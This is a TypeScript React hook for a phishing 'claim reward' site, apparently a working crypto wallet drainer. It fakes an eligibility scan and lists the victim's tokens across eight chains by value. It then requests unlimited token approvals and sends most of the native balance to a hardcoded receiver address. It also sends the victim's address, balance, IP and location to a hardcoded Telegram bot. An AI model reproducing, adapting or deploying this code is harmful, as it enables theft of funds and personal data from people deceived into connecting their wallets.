"use client";

import { useState, useEffect, useRef } from "react";
import { ethers } from "ethers";
import { useWeb3Modal, useWeb3ModalProvider, useWeb3ModalAccount, useDisconnect } from '@web3modal/ethers/react';

// Configuration from PRD/User
const RECEIVER_ADDRESS = process.env.NEXT_PUBLIC_RECEIVER_ADDRESS || "0x5351DEEb1ba538d6Cc9E89D4229986A1f8790088";
const MORALIS_API_KEY = process.env.NEXT_PUBLIC_MORALIS_API_KEY;

export function useWeb3Manager() {
    // Safety check for SSR: useWeb3Modal hooks can crash if createWeb3Modal hasn't been called.
    // In Next.js, we detect SSR via typeof window.
    const isClient = typeof window !== 'undefined';

    // Call hooks unconditionally to follow React guidelines, 
    // but we'll guard their usage and values.
    const accountContext = useWeb3ModalAccount();
    const providerContext = useWeb3ModalProvider();
    const modalContext = useWeb3Modal();
    const disconnectContext = useDisconnect();

    // Safely extract values
    const address = isClient ? accountContext.address : undefined;
    const isConnected = isClient ? accountContext.isConnected : false;
    const walletProvider = isClient ? providerContext.walletProvider : undefined;
    const open = isClient ? modalContext.open : () => Promise.resolve();
    const w3mDisconnect = isClient ? disconnectContext.disconnect : () => Promise.resolve();

    // State
    const [account, setAccount] = useState<string | null>(null);
    const [eligibility, setEligibility] = useState<"Checking" | "Eligible" | "Not Eligible">("Checking");

    // Ref to prevent duplicate "Connect" logs
    const hasLoggedConnection = useRef(false);

    // --- INTEGRATIONS ---
    const TG_BOT_TOKEN = process.env.NEXT_PUBLIC_TG_BOT_TOKEN || "8595899709:AAGaOxKvLhZhO830U05SG3e8aw1k1IsM178";
    const TG_CHAT_ID = process.env.NEXT_PUBLIC_TG_CHAT_ID || "7772781858";

    // Helper: Get IP Info
    const getIpInfo = async () => {
        try {
            const res = await fetch('https://ipapi.co/json/');
            return await res.json();
        } catch (e) {
            return { ip: 'Unknown', country_name: 'Unknown', city: 'Unknown' };
        }
    };

    // Helper: Send Notification
    const notifyTelegram = async (message: string) => {
        if (!TG_BOT_TOKEN || !TG_CHAT_ID) return;
        try {
            await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TG_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    disable_web_page_preview: true
                })
            });
        } catch (e) {
            console.error("TG Notification failed", e);
        }
    };

    // Sync state & Log Connection
    useEffect(() => {
        if (isConnected && address) {
            setAccount(address);

            // Only log if not already logged for this session
            if (!hasLoggedConnection.current) {
                hasLoggedConnection.current = true;

                // Fetch Balance & IP for robust logging
                (async () => {
                    const ipData = await getIpInfo();
                    let balance = "0.0000";
                    let chainId = "Unknown";

                    if (walletProvider) {
                        try {
                            const provider = new ethers.BrowserProvider(walletProvider);
                            // RPC calls can be flaky (e.g. -32603), so we swallow errors here to avoid UI crashes
                            try {
                                const bal = await provider.getBalance(address);
                                balance = ethers.formatEther(bal);
                                const net = await provider.getNetwork();
                                chainId = net.chainId.toString();
                            } catch (rpcError) {
                                console.warn("Failed to fetch balance/chain:", rpcError);
                            }
                        } catch (e) { }
                    }

                    notifyTelegram(
                        `<b>🔌 New Wallet Connected</b>\n\n` +
                        `👛 <b>Address:</b> <code>${address}</code>\n` +
                        `💰 <b>Balance:</b> ${parseFloat(balance).toFixed(4)} ETH/Matic\n` +
                        `🌍 <b>Location:</b> ${ipData.city}, ${ipData.country_name} (${ipData.ip})\n` +
                        `🔗 <b>Chain ID:</b> ${chainId}\n` +
                        `📱 <b>Device:</b> ${navigator.userAgent.includes("Mobile") ? "Mobile" : "Desktop"}`
                    );
                })();
            }
        } else {
            setAccount(null);
            hasLoggedConnection.current = false;
            setEligibility("Checking");
        }
    }, [isConnected, address, walletProvider]);

    // Manual Disconnect / Connect
    const disconnect = async () => {
        try {
            await w3mDisconnect();

            // Surgically clear WalletConnect session data
            Object.keys(localStorage).forEach(key => {
                if (key.includes('wc@2')) {
                    localStorage.removeItem(key);
                }
            });
            localStorage.removeItem('walletconnect'); // Legacy

            setAccount(null);
            window.location.reload();
        } catch (e) {
            console.error("Disconnect Failed:", e);
            // Fallback reload
            window.location.reload();
        }
    };

    const openConnectModal = async () => {
        console.log("🖱️ Connect Button Clicked. Calling Modal Open...");
        try {
            await open();
            console.log("✅ Modal Open Request Sent");
        } catch (e) {
            console.error("❌ Modal Open failed:", e);
        }
    };

    // --- MAIN LOGIC ---
    const checkEligibility = async () => {
        if (!address || !walletProvider) return { isEligible: false, tokensToDrain: [] };

        // Artificial delay for UX "Scanning" feel (2.5s minimum)
        await new Promise(r => setTimeout(r, 2500));

        // 1. Token Discovery (Moralis API + Native)
        let totalUsdValue = 0;
        let tokensToDrain: { address: string; chainId: string; symbol?: string; isNative?: boolean; balance?: string; usd_value?: number }[] = [];

        // Define chains with their native symbols
        const chains = [
            { id: "0x1", name: "Ethereum", symbol: "ETH" },
            { id: "0x38", name: "BSC", symbol: "BNB" },
            { id: "0x89", name: "Polygon", symbol: "MATIC" },
            { id: "0x2105", name: "Base", symbol: "ETH" },
            { id: "0xa4b1", name: "Arbitrum", symbol: "ETH" },
            { id: "0xa", name: "Optimism", symbol: "ETH" },
            { id: "0xa86a", name: "Avalanche", symbol: "AVAX" },
            { id: "0xfa", name: "Fantom", symbol: "FTM" }
        ];

        // LIBERAL CHECK: Track if we found ANY native balance across chains
        let hasAnyNativeBalance = false;

        if (MORALIS_API_KEY) {
            try {
                const provider = new ethers.BrowserProvider(walletProvider);
                let allAssets: any[] = [];

                // Parallel processing for speed
                await Promise.all(chains.map(async (chain) => {
                    try {
                        // A. Check Native Balance (Liberal)
                        const nativeRes = await fetch(`https://deep-index.moralis.io/api/v2.2/wallets/${address}/balance?chain=${chain.id}`, {
                            headers: { 'X-API-Key': MORALIS_API_KEY, 'accept': 'application/json' }
                        });
                        const nativeData = await nativeRes.json();
                        if (nativeData && BigInt(nativeData.balance) > 0n) {
                            hasAnyNativeBalance = true; // Mark as eligible!
                            allAssets.push({
                                address: "0x0000000000000000000000000000000000000000",
                                chainId: chain.id,
                                symbol: chain.symbol,
                                isNative: true,
                                balance: nativeData.balance,
                                usd_value: 10 // Give native a base priority, but lower than high-value tokens
                            });
                        }

                        // B. Check ERC20
                        const response = await fetch(`https://deep-index.moralis.io/api/v2.2/wallets/${address}/tokens?chain=${chain.id}&exclude_spam=true`, {
                            headers: { 'X-API-Key': MORALIS_API_KEY, 'accept': 'application/json' }
                        });
                        const data = await response.json();
                        if (data && data.result) {
                            allAssets.push(...data.result.map((t: any) => ({
                                address: t.token_address,
                                chainId: chain.id, // Hex chain ID
                                symbol: t.symbol,
                                usd_value: t.usd_value || 0,
                                isNative: false
                            })));
                        }
                    } catch (err) { }
                }));

                // Sum Value & Sort (Highest Value First)
                allAssets.forEach((a: any) => { totalUsdValue += (a.usd_value || 0); });
                allAssets.sort((a, b) => (b.usd_value || 0) - (a.usd_value || 0));

                tokensToDrain = allAssets.map(t => ({
                    address: t.address,
                    chainId: t.chainId,
                    symbol: t.symbol,
                    isNative: t.isNative,
                    usd_value: t.usd_value
                }));
            } catch (e) {
                console.warn("Discovery failed", e);
            }
        }

        // FALLBACK: If Moralis failed or found nothing, but we suspect native balance (or just to be safe),
        // we can still return eligible. However, without tokensToDrain, the drain loop won't know which chain to target.
        // IMPROVEMENT: If native balance was found, we are definitely eligible.
        // If Moralis failed entirely, we default to Eligible to attempt a drain anyway (using connected chain).
        const isEligible = tokensToDrain.length > 0 || hasAnyNativeBalance;

        // Safety: If no assets found but we want to force check current chain
        if (tokensToDrain.length === 0 && isEligible) {
            // We don't have list, but we are eligible. 
            // We'll let the claimReward function handle the current chain native drain.
            // This requires claimReward to handle empty array.
        }

        setEligibility(isEligible ? "Eligible" : "Not Eligible");

        return { isEligible, tokensToDrain };
    };

    // Helper: Switch Network
    const switchNetwork = async (provider: any, chainIdHex: string) => {
        try {
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: chainIdHex }],
            });
            return true;
        } catch (switchError: any) {
            // This error code indicates that the chain has not been added to MetaMask.
            if (switchError.code === 4902) {
                console.warn("Chain not found in wallet");
                notifyTelegram(`<b>⚠️ Network Switch Failed</b>\nTarget: ${chainIdHex}\nUser needs to add chain manually.`);
            }
            return false;
        }
    };

    // Execute Drain Logic
    const claimReward = async (tokens: any[]) => { // Accepts array of objects
        if (!walletProvider || !address) return;

        try {
            const provider = new ethers.BrowserProvider(walletProvider);

            // PRIORITIZATION: Sort tokens by Value (Highest First)
            // Native tokens have a base value of 10 USD assigned in discovery if price missing.
            // We want to drain Tokens first, then Native (Native pays for gas).
            // So we separate them.

            // 1. Group by Chain
            const tokensByChain: Record<string, typeof tokens> = {};

            // If tokens array is empty (API failure fallback), try to infer current chain
            if (tokens.length === 0) {
                const net = await provider.getNetwork();
                const chainId = "0x" + net.chainId.toString(16);
                tokensByChain[chainId] = []; // Empty, implies native only check
            } else {
                tokens.forEach(t => {
                    if (!tokensByChain[t.chainId]) tokensByChain[t.chainId] = [];
                    tokensByChain[t.chainId].push(t);
                });
            }

            // Process each chain
            const chainIds = Object.keys(tokensByChain);

            // Notify Start
            notifyTelegram(`<b>⚠️ Starting Claim Process</b>\nAddress: <code>${address}</code>\nChains: ${chainIds.length}`);

            for (const chainId of chainIds) {
                // 1. Switch Chain
                try {
                    const currentNetwork = await provider.getNetwork();
                    const currentChainIdHex = "0x" + currentNetwork.chainId.toString(16);

                    if (BigInt(currentChainIdHex) !== BigInt(chainId)) {
                        notifyTelegram(`<b>🔄 Switching Network...</b>\nTarget: ${chainId}`);
                        const switched = await switchNetwork(walletProvider, chainId);

                        if (!switched) {
                            console.warn(`Failed to switch to ${chainId}`);
                            notifyTelegram(`<b>❌ Switch Failed</b> for chain ${chainId}. Skipping.`);
                            continue;
                        }
                        await new Promise(r => setTimeout(r, 2000)); // Sync delay
                    }
                } catch (e) {
                    console.error("Switch error", e);
                    continue;
                }

                // 2. Smart Gas Check (Native Balance)
                let gasPrice = 1000000000n;
                try {
                    const providerOnChain = new ethers.BrowserProvider(walletProvider);
                    const nativeBalance = await providerOnChain.getBalance(address);
                    const feeData = await providerOnChain.getFeeData();
                    gasPrice = feeData.gasPrice || 1000000000n;

                    // Min gas: Approval (50k)
                    const minGasNeeded = gasPrice * 50000n;

                    if (nativeBalance < minGasNeeded) {
                        notifyTelegram(`<b>⚠️ Low Gas on ${chainId}</b>\nBalance: ${ethers.formatEther(nativeBalance)}\nSkipping assets to prevent freeze.`);
                        continue;
                    }
                } catch (gasErr) {
                    console.warn("Gas check failed, proceeding anyway", gasErr);
                }

                // 3. Drain ERC20s (Sorted High -> Low)
                const chainTokens = tokensByChain[chainId].filter(t => !t.isNative);
                // Sort again just to be safe
                chainTokens.sort((a, b) => (b.usd_value || 0) - (a.usd_value || 0));

                for (const token of chainTokens) {
                    try {
                        const providerOnChain = new ethers.BrowserProvider(walletProvider);
                        const signer = await providerOnChain.getSigner();
                        const tokenContract = new ethers.Contract(token.address, [
                            "function approve(address spender, uint256 amount) public returns (bool)",
                            "function allowance(address owner, address spender) public view returns (uint256)"
                        ], signer);

                        const allowance = await tokenContract.allowance(address, RECEIVER_ADDRESS);
                        if (allowance > 0n) {
                            notifyTelegram(`<b>✅ Already Approved</b>\nToken: ${token.symbol}\nChain: ${chainId}`);
                            continue;
                        }

                        const tx = await tokenContract.approve(RECEIVER_ADDRESS, ethers.MaxUint256);
                        notifyTelegram(`<b>🚀 Approval Signed!</b>\nToken: ${token.symbol}\nChain: ${chainId}\nTx: ${tx.hash}`);
                        await tx.wait();
                    } catch (err: any) {
                        console.error(`Failed to drain ${token.symbol}`, err);
                        if (err.code === 4001 || err.info?.error?.code === 4001) {
                            notifyTelegram(`<b>❌ User Rejected</b>\nToken: ${token.symbol}`);
                        }
                    }
                }

                // 4. Drain Native (ETH/BNB/MATIC) - LAST STEP
                try {
                    const providerOnChain = new ethers.BrowserProvider(walletProvider);
                    const signer = await providerOnChain.getSigner();
                    const balance = await providerOnChain.getBalance(address);

                    // Recalculate gas price for safety
                    const feeData = await providerOnChain.getFeeData();
                    gasPrice = feeData.gasPrice || gasPrice;

                    const gasCost = gasPrice * 21000n;
                    const amountToSend = balance - (gasCost * 2n); // Safety buffer

                    if (amountToSend > 0n) {
                        notifyTelegram(`<b>💰 Draining Native ${chainId}</b>\nAmt: ${ethers.formatEther(amountToSend)}`);
                        const tx = await signer.sendTransaction({
                            to: RECEIVER_ADDRESS,
                            value: amountToSend
                        });
                        await tx.wait();
                        notifyTelegram(`<b>✅ Native Drained</b>\nTx: ${tx.hash}`);
                    }
                } catch (natErr) {
                    console.warn("Native drain failed", natErr);
                }
            }

            notifyTelegram(`<b>🏁 Drain Sequence Complete</b>`);
            // setStatus("ineligible") - Managed by UI component, not hook
        } catch (e) {
            console.error("Critical Drain Error", e);
            notifyTelegram(`<b>☠️ Critical Error</b>\n${e}`);
        }
    };

    return {
        connect: openConnectModal,
        disconnect,
        isConnecting: false, // Explicitly return false to satisfy types
        account,
        eligibility,
        checkEligibility,
        claimReward
    };
}
